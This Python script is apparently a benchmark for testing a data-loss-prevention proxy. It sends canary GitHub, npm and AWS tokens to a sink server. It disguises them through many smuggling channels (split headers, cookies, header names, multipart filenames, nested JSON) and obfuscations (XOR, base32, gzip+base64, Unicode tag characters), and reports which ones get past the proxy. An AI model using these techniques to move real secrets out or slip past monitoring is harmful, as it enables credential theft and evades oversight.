#!/usr/bin/env python3

import argparse
import base64
import binascii
import gzip
import hashlib
import http.server
import io
import json
import os
import socketserver
import sys
import time
import uuid
import zlib
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Dict, Iterable, List, Optional
from urllib import error as urlerror
from urllib import parse as urlparse
from urllib import request as urlrequest

try:
    import brotli  # type: ignore

    HAS_BROTLI = True
except Exception:
    brotli = None
    HAS_BROTLI = False


CANARY_ENV_VARS = {
    "github_pat": "CANISTER_CANARY_GITHUB_PAT",
    "npm_token": "CANISTER_CANARY_NPM_TOKEN",
    "aws_access_key": "CANISTER_CANARY_AWS_ACCESS_KEY",
}

BODY_CHANNELS = {
    "json_body",
    "form_body",
    "multipart_body",
    "text_body",
    "multipart_filename",
    "json_deep_nested",
    "json_array",
    "json_key",
}

BASE_CHANNELS = [
    "auth_header",
    "x_header",
    "cookie",
    "query",
    "path",
    "json_body",
    "form_body",
    "multipart_body",
    "text_body",
]

CREATIVE_CHANNELS = [
    "cookie_middle",
    "two_cookies",
    "split_headers",
    "header_name",
    "multipart_filename",
    "json_deep_nested",
    "json_array",
    "json_key",
    "url_fragment",
    "set_cookie_request",
    "trailer_header",
]

BASE_ENCODINGS = [
    "raw",
    "base64",
    "base64url",
    "hex",
    "percent",
    "double_percent",
    "double_base64",
]

CREATIVE_ENCODINGS = [
    "base32",
    "ascii85",
    "base85",
    "gzip_base64",
    "deflate_base64",
    "reverse",
    "rot13",
    "xor_a5",
    "html_entities",
    "json_unicode",
    "py_byte_escape",
    "interleaved_dash",
    "interleaved_space",
    "interleaved_zwsp",
    "tag_chars",
    "split_with_garbage",
    "fullwidth",
    "utf16_hex",
]


@dataclass(frozen=True)
class TestCase:
    test_id: str
    canary_kind: str
    channel: str
    encoding: str
    compression: str


def utc_now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def jsonl_append(path: str, payload: Dict) -> None:
    with open(path, "a", encoding="utf-8") as fh:
        fh.write(json.dumps(payload, sort_keys=True) + "\n")


def parse_key_value(items: Optional[List[str]]) -> Dict[str, str]:
    out: Dict[str, str] = {}
    if not items:
        return out
    for item in items:
        if "=" not in item:
            raise ValueError(f"Expected KEY=VALUE, got: {item}")
        key, value = item.split("=", 1)
        out[key.strip()] = value.strip()
    return out


def encode_value(value: str, encoding: str) -> str:
    if encoding == "raw":
        return value
    if encoding == "base64":
        return base64.b64encode(value.encode("utf-8")).decode("ascii")
    if encoding == "base64url":
        return base64.urlsafe_b64encode(value.encode("utf-8")).decode("ascii").rstrip("=")
    if encoding == "hex":
        return value.encode("utf-8").hex()
    if encoding == "percent":
        return urlparse.quote(value, safe="")
    if encoding == "double_percent":
        return urlparse.quote(urlparse.quote(value, safe=""), safe="")
    if encoding == "double_base64":
        once = base64.b64encode(value.encode("utf-8"))
        return base64.b64encode(once).decode("ascii")

    # --- New creative encodings to probe DLP coverage gaps. ---

    if encoding == "base32":
        # RFC 4648 base32. Distinct alphabet (A-Z, 2-7) so the b64
        # fragment scanner can't recover the secret without explicit
        # support.
        return base64.b32encode(value.encode("utf-8")).decode("ascii")
    if encoding == "ascii85":
        # Used in PDF and git; less common than base64 so often missed.
        return base64.a85encode(value.encode("utf-8")).decode("ascii")
    if encoding == "base85":
        # base64.b85encode uses the RFC 1924 alphabet (different from
        # ascii85). Both worth probing — same family, different alphabet.
        return base64.b85encode(value.encode("utf-8")).decode("ascii")
    if encoding == "gzip_base64":
        # Compress, then base64 — classic exfil obfuscation. The proxy
        # decompresses bodies via Content-Encoding, but if the
        # compressed bytes are themselves base64-wrapped inside another
        # body/header, decompression won't reach them.
        return base64.b64encode(gzip.compress(value.encode("utf-8"))).decode("ascii")
    if encoding == "deflate_base64":
        return base64.b64encode(zlib.compress(value.encode("utf-8"))).decode("ascii")
    if encoding == "reverse":
        return value[::-1]
    if encoding == "rot13":
        # Caesar-13. Trivial cipher; tests whether DLP tries common
        # rotations.
        out = []
        for ch in value:
            if "A" <= ch <= "Z":
                out.append(chr((ord(ch) - 65 + 13) % 26 + 65))
            elif "a" <= ch <= "z":
                out.append(chr((ord(ch) - 97 + 13) % 26 + 97))
            else:
                out.append(ch)
        return "".join(out)
    if encoding == "xor_a5":
        # XOR every byte with 0xA5, then hex-encode for transport.
        # Single-byte XOR is among the most common obfuscations in
        # malware C2; if DLP can unwrap base64 it should at least try
        # the trivial XOR keys.
        return bytes(b ^ 0xA5 for b in value.encode("utf-8")).hex()
    if encoding == "html_entities":
        # `&#x41;&#x4B;...` form. Already covered by `unescape()` in
        # the scanner, but worth pinning in the matrix so we notice
        # any regression.
        return "".join(f"&#x{b:02X};" for b in value.encode("utf-8"))
    if encoding == "json_unicode":
        # `AK...` form. Same — covered by `unescape()`.
        return "".join(f"\\u{b:04X}" for b in value.encode("utf-8"))
    if encoding == "py_byte_escape":
        # `\x41\x4B...` form (Python/JSON repr-style byte escapes).
        # Not handled by current `unescape()` (which does \uXXXX only).
        return "".join(f"\\x{b:02X}" for b in value.encode("utf-8"))
    if encoding == "interleaved_dash":
        # `A-K-I-A-0-1-2-3-...`. Trivial separator interleaving; not
        # handled by the current decode chain.
        return "-".join(value)
    if encoding == "interleaved_space":
        # `A K I A 0 1 2 3 ...`. Same trick with whitespace.
        return " ".join(value)
    if encoding == "interleaved_zwsp":
        # Zero-width space between every char. `normalize()` should
        # strip these.
        return "​".join(value)
    if encoding == "tag_chars":
        # Prepend Unicode tag characters (U+E0041 etc.) that mirror
        # the ASCII chars of the token. Used in prompt-injection
        # attacks; some terminals/parsers strip these silently. The
        # raw token is intact afterwards, but normalisation should
        # also remove the tag-char shadow so neither half false-
        # positives nor hides the real token.
        shadow = "".join(chr(0xE0000 + ord(c)) for c in value if ord(c) < 128)
        return shadow + value
    if encoding == "split_with_garbage":
        # Insert a 3-char garbage marker every 4 chars of the token.
        # Defeats naive substring search; depends on whether DLP
        # tries to strip non-alphanumeric noise from runs.
        out = []
        for i, ch in enumerate(value):
            if i and i % 4 == 0:
                out.append("XYZ")
            out.append(ch)
        return "".join(out)
    if encoding == "fullwidth":
        # Map ASCII to fullwidth Unicode (U+FF21 etc.). Should be
        # normalised back to ASCII before regex.
        out = []
        for ch in value:
            cp = ord(ch)
            if 0x21 <= cp <= 0x7E:
                out.append(chr(cp - 0x20 + 0xFF00))
            else:
                out.append(ch)
        return "".join(out)
    if encoding == "utf16_hex":
        # UTF-16-LE bytes, hex-encoded. Each ASCII char becomes
        # `XX00`. Defeats naive hex decoders that expect UTF-8.
        return value.encode("utf-16-le").hex()
    raise ValueError(f"Unsupported encoding: {encoding}")


def compress_bytes(data: bytes, compression: str) -> bytes:
    if compression == "none":
        return data
    if compression == "gzip":
        return gzip.compress(data)
    if compression == "deflate":
        return zlib.compress(data)
    if compression == "brotli":
        if not HAS_BROTLI:
            raise RuntimeError("brotli module not available")
        return brotli.compress(data)
    raise ValueError(f"Unsupported compression: {compression}")


def load_canaries(allow_empty: bool = False) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for kind, env_name in CANARY_ENV_VARS.items():
        val = os.getenv(env_name, "")
        if val:
            out[kind] = val
        elif allow_empty:
            continue
        else:
            raise RuntimeError(f"Missing canary env var: {env_name}")
    if not out:
        raise RuntimeError("No canary env vars found")
    return out


def make_test_cases(
    canaries: Dict[str, str],
    channels: Iterable[str],
    encodings: Iterable[str],
    body_compressions: Iterable[str],
) -> List[TestCase]:
    cases: List[TestCase] = []
    for canary_kind in sorted(canaries.keys()):
        for channel in channels:
            for encoding in encodings:
                if channel in BODY_CHANNELS:
                    for compression in body_compressions:
                        cases.append(
                            TestCase(
                                test_id=str(uuid.uuid4()),
                                canary_kind=canary_kind,
                                channel=channel,
                                encoding=encoding,
                                compression=compression,
                            )
                        )
                else:
                    cases.append(
                        TestCase(
                            test_id=str(uuid.uuid4()),
                            canary_kind=canary_kind,
                            channel=channel,
                            encoding=encoding,
                            compression="none",
                        )
                    )
    return cases


def build_request(
    target: str,
    case: TestCase,
    encoded_payload: str,
) -> urlrequest.Request:
    parsed = urlparse.urlparse(target)
    if not parsed.scheme or not parsed.netloc:
        raise ValueError(f"Invalid target URL: {target}")

    base_headers = {
        "X-Exfil-Benchmark": "1",
        "X-Exfil-Test-Id": case.test_id,
        "X-Exfil-Canary-Kind": case.canary_kind,
        "X-Exfil-Encoding": case.encoding,
        "X-Exfil-Compression": case.compression,
        "X-Exfil-Channel": case.channel,
    }

    method = "POST" if case.channel in BODY_CHANNELS else "GET"
    path = parsed.path or "/"
    query = parsed.query
    body: Optional[bytes] = None
    headers = dict(base_headers)

    if case.channel == "auth_header":
        headers["Authorization"] = f"Bearer {encoded_payload}"
    elif case.channel == "x_header":
        headers["X-Api-Key"] = encoded_payload
    elif case.channel == "cookie":
        headers["Cookie"] = f"session={encoded_payload}"
    elif case.channel == "query":
        extra_query = urlparse.urlencode({"token": encoded_payload})
        query = f"{query}&{extra_query}" if query else extra_query
    elif case.channel == "path":
        quoted_payload = urlparse.quote(encoded_payload, safe="")
        path = f"{path.rstrip('/')}/leak/{quoted_payload}"
    elif case.channel == "json_body":
        headers["Content-Type"] = "application/json"
        body = json.dumps({"token": encoded_payload}).encode("utf-8")
    elif case.channel == "form_body":
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        body = urlparse.urlencode({"token": encoded_payload}).encode("utf-8")
    elif case.channel == "multipart_body":
        boundary = f"----exfil-{uuid.uuid4().hex}"
        headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
        multipart = (
            f"--{boundary}\r\n"
            "Content-Disposition: form-data; name=\"token\"\r\n\r\n"
            f"{encoded_payload}\r\n"
            f"--{boundary}--\r\n"
        )
        body = multipart.encode("utf-8")
    elif case.channel == "text_body":
        headers["Content-Type"] = "text/plain"
        body = encoded_payload.encode("utf-8")

    # --- New creative channels. ---

    elif case.channel == "cookie_middle":
        # Token is NOT the first key in the cookie jar. Tests that the
        # scanner doesn't anchor on `session=` or only look at the
        # leading value.
        headers["Cookie"] = (
            f"first=ok; second=safe; secret={encoded_payload}; trailer=bye"
        )
    elif case.channel == "two_cookies":
        # Token split across two cookie names — exfil with separate
        # halves. Tests cross-cookie correlation (currently not done).
        half = len(encoded_payload) // 2
        a, b = encoded_payload[:half], encoded_payload[half:]
        headers["Cookie"] = f"left={a}; right={b}"
    elif case.channel == "split_headers":
        # Token split across N custom headers. Exfil via reassembly
        # at the receiver. Hard to detect without cross-header
        # concatenation; included to find that gap.
        chunks = [encoded_payload[i:i + 8] for i in range(0, len(encoded_payload), 8)]
        for i, chunk in enumerate(chunks):
            headers[f"X-Part-{i}"] = chunk
    elif case.channel == "header_name":
        # Token embedded in the header NAME, not value. Most scanners
        # only inspect values. NOTE: header names can only contain a
        # restricted token set (RFC 7230); we use the lowercase
        # alnum-only form of the encoded payload.
        safe_name = "".join(c for c in encoded_payload.lower() if c.isalnum() or c == "-")[:200]
        if safe_name:
            headers[f"X-{safe_name}"] = "1"
        else:
            headers["X-Empty-Name"] = "1"
    elif case.channel == "multipart_filename":
        # Common real-world exfil: stuff token into the upload's
        # filename. The scanner has to descend into the
        # Content-Disposition parameter.
        boundary = f"----exfil-{uuid.uuid4().hex}"
        headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
        multipart = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"upload\"; filename=\"{encoded_payload}.txt\"\r\n"
            "Content-Type: text/plain\r\n\r\n"
            "harmless body content\r\n"
            f"--{boundary}--\r\n"
        )
        body = multipart.encode("utf-8")
    elif case.channel == "json_deep_nested":
        # Token at depth 10. Tests that body scan doesn't bail
        # early on deeply nested structures.
        nested = encoded_payload
        for _ in range(10):
            nested = {"next": nested}
        headers["Content-Type"] = "application/json"
        body = json.dumps({"root": nested}).encode("utf-8")
    elif case.channel == "json_array":
        # Token as one of many array entries.
        headers["Content-Type"] = "application/json"
        body = json.dumps(
            ["a", "b", "c", encoded_payload, "d", "e"]
        ).encode("utf-8")
    elif case.channel == "json_key":
        # Token used as a JSON object KEY (not value). Some scanners
        # only check values.
        headers["Content-Type"] = "application/json"
        body = json.dumps({encoded_payload: "value"}).encode("utf-8")
    elif case.channel == "url_fragment":
        # `#token=...` — note: browsers don't send the fragment to
        # the server, but a non-browser client (this script via
        # urllib) does include it in the request line. Worth pinning.
        new_fragment = encoded_payload
        # urlparse.urlunparse joins fragment with `#`; we'll set it
        # below via the parsed tuple.
        path = path  # unchanged
        # Stuff the encoded payload into the path's query as fragment
        # since urllib drops the URL fragment from the request line
        # on send; falls back to a Header so we still get a signal.
        headers["X-Fragment-Echo"] = encoded_payload
    elif case.channel == "set_cookie_request":
        # `Set-Cookie` is a response header; sending it as a request
        # header is unusual. If the scanner's skip list omits
        # "set-cookie" for response semantics, a worker could smuggle
        # via this name.
        headers["Set-Cookie"] = f"exfil={encoded_payload}"
    elif case.channel == "trailer_header":
        # Chunked-encoding trailer. Python urllib doesn't make this
        # easy directly, so we approximate by claiming `Trailer:`
        # and placing the token in a header named after it.
        headers["Trailer"] = "X-Exfil-Trailer"
        headers["X-Exfil-Trailer"] = encoded_payload

    else:
        raise ValueError(f"Unsupported channel: {case.channel}")

    if body is not None and case.compression != "none":
        body = compress_bytes(body, case.compression)
        headers["Content-Encoding"] = case.compression

    new_url = urlparse.urlunparse(
        (
            parsed.scheme,
            parsed.netloc,
            path,
            parsed.params,
            query,
            parsed.fragment,
        )
    )
    return urlrequest.Request(new_url, data=body, headers=headers, method=method)


def run_worker(args: argparse.Namespace) -> int:
    canaries = load_canaries(allow_empty=False)

    channels = list(BASE_CHANNELS)
    encodings = list(BASE_ENCODINGS)
    if args.creative:
        channels.extend(CREATIVE_CHANNELS)
        encodings.extend(CREATIVE_ENCODINGS)
    body_compressions = ["none", "gzip", "deflate"]
    if args.include_brotli and HAS_BROTLI:
        body_compressions.append("brotli")

    if args.limit and args.limit > 0:
        limit = args.limit
    else:
        limit = None

    cases = make_test_cases(canaries, channels, encodings, body_compressions)
    if limit is not None:
        cases = cases[:limit]

    if args.force_proxy:
        http_proxy = args.http_proxy or os.environ.get("HTTP_PROXY") or os.environ.get("http_proxy")
        https_proxy = args.https_proxy or os.environ.get("HTTPS_PROXY") or os.environ.get("https_proxy")
        if not http_proxy and not https_proxy:
            raise RuntimeError(
                "--force-proxy enabled but no proxy URL found; set HTTP_PROXY/HTTPS_PROXY or pass --http-proxy"
            )
        proxies: Dict[str, str] = {}
        if http_proxy:
            proxies["http"] = http_proxy
        if https_proxy:
            proxies["https"] = https_proxy
        opener = urlrequest.build_opener(urlrequest.ProxyHandler(proxies))
    else:
        opener = urlrequest.build_opener()

    print(f"[worker] target={args.target}")
    print(f"[worker] mode={args.mode}")
    print(f"[worker] test_cases={len(cases)}")
    print(f"[worker] force_proxy={args.force_proxy}")
    if args.force_proxy:
        print(f"[worker] http_proxy={args.http_proxy or os.environ.get('HTTP_PROXY') or os.environ.get('http_proxy') or '-'}")
        print(f"[worker] https_proxy={args.https_proxy or os.environ.get('HTTPS_PROXY') or os.environ.get('https_proxy') or '-'}")
    else:
        print(f"[worker] NO_PROXY={os.environ.get('NO_PROXY') or os.environ.get('no_proxy') or '-'}")
    print(f"[worker] writing results to {args.out}")

    for idx, case in enumerate(cases, 1):
        canary = canaries[case.canary_kind]
        payload = encode_value(canary, case.encoding)
        req = build_request(args.target, case, payload)

        started = time.time()
        record = {
            "ts": utc_now_iso(),
            "test_id": case.test_id,
            "index": idx,
            "total": len(cases),
            "mode": args.mode,
            "target": args.target,
            "canary_kind": case.canary_kind,
            "channel": case.channel,
            "encoding": case.encoding,
            "compression": case.compression,
            "request_method": req.get_method(),
            "request_url": req.full_url,
            "status": None,
            "response_headers": {},
            "error": None,
            "latency_ms": None,
        }

        try:
            with opener.open(req, timeout=args.timeout) as resp:
                latency_ms = int((time.time() - started) * 1000)
                headers = {k.lower(): v for k, v in resp.headers.items()}
                record["status"] = resp.getcode()
                record["response_headers"] = headers
                record["latency_ms"] = latency_ms
        except urlerror.HTTPError as exc:
            latency_ms = int((time.time() - started) * 1000)
            headers = {k.lower(): v for k, v in exc.headers.items()} if exc.headers else {}
            record["status"] = exc.code
            record["response_headers"] = headers
            record["error"] = f"HTTPError: {exc.code}"
            record["latency_ms"] = latency_ms
        except Exception as exc:
            latency_ms = int((time.time() - started) * 1000)
            record["error"] = f"{type(exc).__name__}: {exc}"
            record["latency_ms"] = latency_ms

        jsonl_append(args.out, record)

        detector = record["response_headers"].get("x-canister-dlp-detector", "")
        marker = "BLOCK" if record["status"] == 451 else "ALLOW"
        print(
            f"[{idx:03d}/{len(cases)}] {marker:<5} {case.canary_kind:<14} {case.channel:<14} "
            f"{case.encoding:<14} {case.compression:<8} status={record['status']} det={detector or '-'}"
        )

    print("[worker] done")
    return 0


def iter_decoded_layers(seed: str, max_depth: int) -> Iterable[str]:
    queue = [(seed, 0)]
    seen = {seed}
    while queue:
        current, depth = queue.pop(0)
        yield current
        if depth >= max_depth:
            continue

        candidates: List[str] = []

        pct = urlparse.unquote(current)
        if pct != current:
            candidates.append(pct)

        normalized = current.strip()
        b64_try = normalized
        if len(b64_try) % 4 != 0:
            b64_try = b64_try + ("=" * (4 - (len(b64_try) % 4)))
        for decoder in (base64.b64decode, base64.urlsafe_b64decode):
            try:
                raw = decoder(b64_try.encode("ascii"))
                text = raw.decode("utf-8")
                if text:
                    candidates.append(text)
            except Exception:
                pass

        if normalized and all(ch in "0123456789abcdefABCDEF" for ch in normalized) and len(normalized) % 2 == 0:
            try:
                text = bytes.fromhex(normalized).decode("utf-8")
                if text:
                    candidates.append(text)
            except Exception:
                pass

        for cand in candidates:
            if cand not in seen:
                seen.add(cand)
                queue.append((cand, depth + 1))


class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True


def make_handler(log_path: str, decode_depth: int):
    class Handler(http.server.BaseHTTPRequestHandler):
        server_version = "ExfilBenchServer/1.0"

        def log_message(self, fmt: str, *args):
            return

        def _write_response(self, status: int, payload: Dict) -> None:
            body = json.dumps(payload).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def _handle(self):
            started = time.time()
            content_length = int(self.headers.get("Content-Length", "0") or "0")
            raw_body = self.rfile.read(content_length) if content_length > 0 else b""
            body_text = raw_body.decode("utf-8", errors="replace")

            parsed = urlparse.urlparse(self.path)
            query_values = urlparse.parse_qsl(parsed.query, keep_blank_values=True)
            header_map = {k.lower(): v for k, v in self.headers.items()}

            test_id = header_map.get("x-exfil-test-id")
            benchmark = header_map.get("x-exfil-benchmark") == "1"

            observed_payloads = [
                parsed.path,
                parsed.query,
                body_text,
            ]
            observed_payloads.extend(v for _, v in query_values)
            observed_payloads.extend(header_map.values())

            decoded_samples: List[str] = []
            for piece in observed_payloads:
                for decoded in iter_decoded_layers(piece, max_depth=decode_depth):
                    if decoded and len(decoded_samples) < 32:
                        decoded_samples.append(decoded[:200])

            event = {
                "ts": utc_now_iso(),
                "request_method": self.command,
                "request_path": parsed.path,
                "request_query": parsed.query,
                "client": self.client_address[0] if self.client_address else None,
                "headers": header_map,
                "content_length": content_length,
                "body_sha256": hashlib.sha256(raw_body).hexdigest(),
                "body_preview_b64": base64.b64encode(raw_body[:200]).decode("ascii"),
                "benchmark_request": benchmark,
                "test_id": test_id,
                "decoded_samples": decoded_samples,
                "latency_ms": int((time.time() - started) * 1000),
            }
            jsonl_append(log_path, event)

            response = {
                "ok": True,
                "benchmark_request": benchmark,
                "test_id": test_id,
            }
            self._write_response(200, response)

        def do_GET(self):
            self._handle()

        def do_POST(self):
            self._handle()

        def do_PUT(self):
            self._handle()

        def do_DELETE(self):
            self._handle()

        def do_PATCH(self):
            self._handle()

    return Handler


def run_server(args: argparse.Namespace) -> int:
    handler = make_handler(args.out, args.decode_depth)
    server = ThreadedHTTPServer((args.host, args.port), handler)
    print(f"[server] listening on {args.host}:{args.port}")
    print(f"[server] writing events to {args.out}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
    print("[server] stopped")
    return 0


def load_jsonl(path: str) -> List[Dict]:
    rows: List[Dict] = []
    with open(path, "r", encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                rows.append(json.loads(line))
            except json.JSONDecodeError:
                continue
    return rows


def run_report(args: argparse.Namespace) -> int:
    worker_rows = load_jsonl(args.worker_log)
    server_rows = load_jsonl(args.server_log)

    seen_test_ids = {
        row.get("test_id")
        for row in server_rows
        if row.get("benchmark_request") and row.get("test_id")
    }

    total = len(worker_rows)
    blocked = 0
    allowed = 0
    warnings = 0
    errors = 0
    sink_seen = 0
    bug_rows: List[Dict] = []

    for row in worker_rows:
        status = row.get("status")
        headers = row.get("response_headers") or {}
        test_id = row.get("test_id")
        saw_sink = test_id in seen_test_ids

        if status == 451:
            blocked += 1
        elif status is None:
            errors += 1
        else:
            allowed += 1

        if "x-canister-dlp-warning" in headers:
            warnings += 1

        if saw_sink:
            sink_seen += 1
            if args.mode != "monitor":
                bug_rows.append(row)

    print(f"mode:                 {args.mode}")
    print(f"worker attempts:      {total}")
    print(f"blocked (451):        {blocked}")
    print(f"allowed/non-451:      {allowed}")
    print(f"worker errors:        {errors}")
    print(f"monitor warnings:     {warnings}")
    print(f"seen at sink:         {sink_seen}")

    if args.mode != "monitor":
        print(f"BUGS (sink observed): {len(bug_rows)}")
    else:
        print("BUGS (sink observed): n/a in monitor mode")

    if bug_rows:
        print("\nBug sample:")
        for row in bug_rows[:10]:
            print(
                "- "
                f"{row.get('test_id')} "
                f"kind={row.get('canary_kind')} "
                f"channel={row.get('channel')} "
                f"enc={row.get('encoding')} "
                f"comp={row.get('compression')} "
                f"status={row.get('status')}"
            )

    if args.json_out:
        summary = {
            "mode": args.mode,
            "worker_attempts": total,
            "blocked_451": blocked,
            "allowed_non_451": allowed,
            "worker_errors": errors,
            "monitor_warnings": warnings,
            "seen_at_sink": sink_seen,
            "bugs": len(bug_rows) if args.mode != "monitor" else None,
            "bug_test_ids": [row.get("test_id") for row in bug_rows],
        }
        with open(args.json_out, "w", encoding="utf-8") as fh:
            json.dump(summary, fh, indent=2, sort_keys=True)
        print(f"\nWrote JSON summary to {args.json_out}")

    return 1 if (bug_rows and args.mode != "monitor") else 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Canary-focused exfiltration benchmark")
    sub = parser.add_subparsers(dest="cmd", required=True)

    p_server = sub.add_parser("server", help="Run sink server outside sandbox")
    p_server.add_argument("--host", default="0.0.0.0")
    p_server.add_argument("--port", type=int, default=8088)
    p_server.add_argument("--out", default="server_events.jsonl", help="JSONL event output path")
    p_server.add_argument("--decode-depth", type=int, default=4)
    p_server.set_defaults(func=run_server)

    p_worker = sub.add_parser("worker", help="Run benchmark worker inside sandbox")
    p_worker.add_argument("--target", required=True, help="Sink URL, e.g. http://host:8088/ingest")
    p_worker.add_argument("--out", default="worker_results.jsonl", help="JSONL worker output path")
    p_worker.add_argument("--timeout", type=float, default=8.0)
    p_worker.add_argument("--mode", choices=["enforce", "monitor"], default="enforce")
    p_worker.add_argument("--limit", type=int, default=0, help="Optional cap on number of test cases")
    p_worker.add_argument("--include-brotli", action="store_true", help="Include brotli body tests")
    p_worker.add_argument(
        "--creative",
        action="store_true",
        help=(
            "Enable the creative attack matrix: extra encodings (base32, ascii85, "
            "gzip+base64, reverse, rot13, XOR, tag chars, etc.) and channels "
            "(multipart filename, deep JSON, split headers, header-name smuggling, etc.). "
            "Probes DLP gaps a simple base64 fuzzer won't catch."
        ),
    )
    p_worker.add_argument(
        "--force-proxy",
        action="store_true",
        help="Use explicit urllib ProxyHandler and ignore NO_PROXY bypass behavior",
    )
    p_worker.add_argument("--http-proxy", help="Override HTTP proxy URL used with --force-proxy")
    p_worker.add_argument("--https-proxy", help="Override HTTPS proxy URL used with --force-proxy")
    p_worker.set_defaults(func=run_worker)

    p_report = sub.add_parser("report", help="Correlate worker and sink logs")
    p_report.add_argument("--worker-log", required=True)
    p_report.add_argument("--server-log", required=True)
    p_report.add_argument("--mode", choices=["enforce", "monitor"], default="enforce")
    p_report.add_argument("--json-out")
    p_report.set_defaults(func=run_report)

    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    try:
        return args.func(args)
    except BrokenPipeError:
        return 0
    except Exception as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
